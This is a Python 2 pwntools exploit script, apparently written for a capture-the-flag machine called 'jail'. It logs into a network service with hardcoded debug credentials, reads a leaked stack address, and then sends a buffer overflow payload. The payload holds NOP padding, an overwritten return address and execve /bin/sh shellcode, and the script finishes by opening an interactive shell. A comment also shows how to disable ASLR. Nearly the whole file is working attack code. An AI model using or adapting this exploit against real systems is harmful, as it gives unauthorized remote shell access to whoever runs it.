#!/usr/bin/env python2
# -*- encoding:utf-8 -*-

# `sudo sysctl -w kernel.randomize_va_space=0` to disable ASLR
# Ref: https://unix.stackexchange.com/questions/89211/
# Ref: https://linux.die.net/man/8/execstack
# Ref: http://shell-storm.org/shellcode/files/shellcode-811.php
# Ref: https://stackoverflow.com/questions/38189169/
# Ref: https://linux-audit.com/linux-aslr-and-kernelrandomize_va_space-setting/

DEBUG_FLAG = True

from pwn import *
context(os="linux", arch="i386")
context.terminal = ['tmux', 'new-window']   # Open a new terminal in current tmux session

if DEBUG_FLAG:
    p = remote('127.0.0.1', 7411)
    p2 = remote('127.0.0.1', 7411)
    context.log_level = 'DEBUG'
    # p = gdb.debug('./jail', gdbscript='''set follow-fork-mode child
# set detach-on-fork off
# set disable-randomization
# set disassembly-flavor intel
# ''')
else:
    p = remote('10.10.10.34', 7411)
    p2 = remote('10.10.10.34', 7411)
    context.log_level = 'INFO'

# Get leaked address first since it doesn't enable ASLR
p.recvline()  # 'OK Ready. Send USER command.\n'
p.sendline('DEBUG')
p.recvline()  # 'OK DEBUG mode on.\n'
p.sendline('USER admin')
p.recvline()  # 'OK Send PASS command.\n'
p.sendline('PASS beepbeep')
temp_addr = p.recvline()  # 'Debug: userpass buffer @ 0xff93e350\n'
leaked_addr = int(temp_addr.strip().split(' ')[-1], 16)
print "Leaked Address: " + str(hex(leaked_addr))
try:
    p.recvlines()
except EOFError:
    pass

# Use a new connection to spawn our shell
p2.recvline()  # 'OK Ready. Send USER command.\n'
p2.sendline('DEBUG')
p2.recvline()  # 'OK DEBUG mode on.\n'
p2.sendline('USER admin')
p2.recvline()  # 'OK Send PASS command.\n'

# 0x90 == nop, 0xcc == int3
msgbase = 'PASS '
junk = "\x90" * 28
shellc = ''
shellc += '\x31\xc0\x50\x68\x2f\x2f\x73'
shellc += '\x68\x68\x2f\x62\x69\x6e\x89'
shellc += '\xe3\x89\xc1\x89\xc2\xb0\x0b'
shellc += '\xcd\x80\x31\xc0\x40\xcd\x80'
finalmsg = msgbase + junk + p32(leaked_addr + 32) + shellc

p2.sendline(finalmsg)
p2.interactive()
